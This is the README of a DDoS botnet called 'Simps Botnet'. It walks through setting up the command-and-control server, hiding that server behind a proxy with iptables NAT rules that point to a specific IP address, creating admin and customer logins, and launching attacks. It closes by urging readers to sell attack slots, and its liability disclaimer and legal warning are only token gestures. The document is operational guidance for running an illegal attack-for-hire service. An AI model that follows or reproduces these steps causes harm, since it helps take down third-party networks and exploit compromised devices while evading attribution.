# Simps Botnet

* read everything below to know the rules to Simps Botnet 

## Requirements
* Domain
* Proxy
* Hosting [Ubuntu 20.04] you dont need 20.04 thats what I prefer.
* Scanning
* Common Sense

## Credits
* UR0A
* Delusionalz
* b1narythag0d

## Disclaimer
* Everyone associated with creating Simps Botnet is in no way responsible with what you do with it.

## Warning
* DDoS attacks are illegal under the Computer Fraud and Abuse Act. Starting a DDoS attack against a network without permission is going to cost you up to 10 years in prison and up to a $500,000 fine.

## Setup Tut Below

## i took out the selfrep and killer from the main.c in the debug line 4544

1. Change Ips In Files.
just change them in everything its not hard

2. Setting It Up.
The setup is very simple.
Drag the files in to your vps after you change all the ips and everything you need to.
Your then going to cd into the Botnet folder and then run "sh auto.sh" and let that run this is going to setup everything for you
* this is old 
# Everything now is auto lol...
all you will need to do is screen it after.
his is old once it is done run "screen ./c2 BotPort CncPort"


1. Proxying The Net.
So if your cnc port is still 55555 your going to keep this the way it is if not change the --dport to your cnc port your then going to change the destination server ip to your hosting server.
btw make sure you set your domain to the proxy server this was when they search for the ip through the domain it comes up your proxy server not your hosting server.
iptables -F
sysctl -w net.ipv4.ip_forward=1
iptables -A FORWARD -i eth0 -j ACCEPT
iptables -A FORWARD -o eth0 -j ACCEPT
iptables -I FORWARD -i eth0 -p tcp --dport 55555 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 55555 -j DNAT --to-destination 66.228.42.254:55555
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -t mangle -A PREROUTING -p icmp -j DROP

5. login to net.
you first need to add logins to "/Botnet/cnc/login.txt" it will be "user pass id maxtime cooldown"
Example of a user for admin "user pass admin 300 30"
with that example the username is user the pass is pass its a admin user maxtime is 300 seconds and cooldown is 30.
To add a common user all u have to do is put common not admin.
All admins can really do is add logins to the net as of right now.
you can then Open your putty put in your domain for the ip, port put your cncport default is 55555 then connection type is raw u can then open and login.

6. Enjoy
Please Enjoy Simps Botnet and sell some spots, but please dont skid rip the source lol...
but fr if you want to make it look a little diffrent i understand just leave my credits somewhere.   